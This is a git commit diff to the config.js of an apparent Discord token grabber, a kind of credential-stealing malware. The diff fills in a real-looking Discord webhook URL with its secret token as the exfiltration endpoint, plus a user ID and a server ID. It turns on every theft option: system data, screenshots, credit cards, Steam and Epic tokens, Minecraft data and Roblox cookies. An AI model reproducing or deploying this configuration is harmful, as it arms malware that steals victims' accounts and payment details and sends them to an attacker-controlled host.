7db2acc47007025a9164ba576c0b55c9391291d0
salvadorex2 <111508419+salvadorex2@users.noreply.github.com>
2022-09-09 20:35:32 +0300

    Update config.js

--- config.js
+++ config.js
@@ -1,9 +1,9 @@
 {
     // discord token grabber settings
 
-    "webhook": "WEBHOOK HERE",
-    "discord_id": "ENTER YOUR DISCORD ID",
-    "server_id": "ENTER YOUR SERVER ID",
+    "webhook": "https://discord.com/api/webhooks/1017849844007698453/pezggHSEXQeBYBObrJz29iuY29oglulTYGG47sWf6QxVLeh6C506VzrzYBaVfdqqlbnE",
+    "discord_id": "852641865563373599",
+    "server_id": "1017849707546026096",
 
    // you can change this if you have your own!
 
@@ -11,11 +11,11 @@
 
  // set to "true" and "false" only!
 
-    "grab_system": "false", 
-    "grab_screenhot": "false",
-    "grab_creditcard": "false",
-    "grab_steamtoken": "false",
-    "grab_epictoken": "false",
-    "grab_minecraft": "false",
-    "grab_robloxcookie": "false",
+    "grab_system": "true", 
+    "grab_screenhot": "true",
+    "grab_creditcard": "true",
+    "grab_steamtoken": "true",
+    "grab_epictoken": "true",
+    "grab_minecraft": "true",
+    "grab_robloxcookie": "true",
 }
